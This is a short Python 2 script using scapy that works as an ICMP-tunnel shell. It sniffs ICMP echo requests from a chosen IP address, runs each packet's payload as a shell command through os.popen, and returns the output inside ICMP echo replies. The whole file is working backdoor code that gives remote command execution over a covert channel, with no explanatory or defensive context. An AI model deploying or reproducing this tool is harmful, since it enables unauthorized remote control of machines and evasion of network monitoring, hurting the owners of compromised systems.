#!/usr/bin/env python2
from scapy.all import sr,IP,ICMP,Raw,sniff
import argparse
import os

# Variables
ICMP_ID = 13170
TTL = 64

def check_scapy():
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print("Install the Py2 scapy module")

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def icmpshell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()
        icmppacket = IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload)
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

print("[+]ICMP listener started!")
sniff(iface=args.interface, prn=icmpshell, filter="icmp", store=0)
